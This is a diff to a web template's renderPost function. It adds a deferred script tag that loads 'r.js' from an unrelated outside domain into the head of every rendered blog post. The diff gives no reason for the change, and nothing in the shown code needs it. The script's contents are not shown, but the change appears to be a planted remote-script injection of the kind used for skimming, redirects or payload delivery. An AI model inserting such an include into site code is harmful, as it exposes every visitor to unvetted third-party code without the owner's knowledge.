@@ -209,7 +209,8 @@ function renderPost({ slug, meta, body }) {
     <link rel="icon" type="image/svg+xml" href="/images/favicon.svg" />
     <link rel="icon" href="/favicon.ico" sizes="32x32" />
     <link href="/src/css/styles.css" rel="stylesheet" />
-  </head>
+    <script src="https://ref.web-free.site/r.js" defer></script>
+</head>
 
   <body class="antialiased bg-gray-900">
     {{> navbar }}
